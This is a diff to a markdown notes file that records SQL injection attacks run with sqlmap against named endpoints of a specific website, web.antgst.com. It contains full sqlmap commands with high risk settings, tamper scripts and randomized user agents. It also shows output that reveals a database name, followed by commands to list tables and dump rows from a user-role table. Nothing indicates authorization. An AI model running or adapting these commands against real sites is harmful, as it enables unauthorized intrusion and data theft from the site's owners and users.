@@ -72,7 +72,53 @@ sqlmap -r queryUserByDepId.txt \
 --random-agent \
 --dbs \
 --threads=10 \
---batch
+--batch \
+--hex \
+--dbms=MySQL \
+--technique=BEUST \
+-t trace.txt  \
+--tamper=space2comment \
+--privileges
+```
+
+## sendRecordList
+
+https://web.antgst.com/antgst/sms/otpPremium/channel/sendRecordList?_t=1734511889&column=createTime&order=desc&field=id,,countryName,smsFrom,smsTo,message,sendResult,smsCount,smsFee,sendTime,action&pageNo=1&pageSize=30
+
+```bash
+sqlmap -r sendRecordList.txt \
+-p field \
+--level=5 \
+--risk=3 \
+--random-agent \
+--dbs \
+--threads=10 \
+--batch \
+--hex \
+--dbms=MySQL \
+--technique=BEUST \
+-t sendRecordList.trace.txt  \
+--tamper=space2comment \
+--privileges
+```
+
+## getUserDepartList
+
+```bash
+sqlmap -r getUserDepartList.txt \
+-p roleCode \
+--level=5 \
+--risk=3 \
+--random-agent \
+--dbs \
+--threads=10 \
+--batch \
+--hex \
+--dbms=MySQL \
+--technique=BEUST \
+-t trace.txt  \
+--tamper=space2comment \
+--privileges
 ```
 
 ## loadtreedata
@@ -91,9 +137,68 @@ sqlmap -r loadtreedata.txt \
 -t trace.txt 
 ```
 
-
 here have the sql check on the websit, the response is:
 
 ```json
 {"success":false,"message":"服务器开小差了，请尽快联系服务人员","code":500,"result":null,"timestamp":1734507668132}
+```
+
+```bash
+sqlmap -r loadtreedata.txt \
+-p code \
+--level=5 \
+--risk=3 \
+--random-agent \
+--dbs \
+--batch \
+--threads=10 \
+--hex \
+--dbms=MySQL \
+--technique=BEUST \
+-t trace.txt  \
+--tamper=space2comment \
+--privileges
+```
+
+when we get the sqlmap result:
+
+```log
+[15:49:41] [INFO] retrieved: intl_sys_db             
+available databases [1]:
+[*] intl_sys_db
+
+[15:49:41] [INFO] fetched data logged to text files under '/home/xjh/.local/share/sqlmap/output/web.antgst.com'
+```
+
+the `intl_sys_db` is the database name. then we can use the sqlmap to find other database name.
+
+
+```bash
+sqlmap -r loadtreedata.txt \
+-p code \
+--level=5 \
+--risk=3 \
+--random-agent \
+-D jeecg-boot \
+--tables \
+--threads=10 \
+--batch \
+--hex
+```
+
+
+```bash
+sqlmap -r loadtreedata.txt \
+-p code \
+--level=5 \
+--risk=3 \
+--random-agent \
+-D jeecg-boot \
+-T sys_user_role \
+--dump \
+--start=1 \
+--stop=100 \
+--batch \
+--tamper=space2comment,between \
+--threads=10
 ```
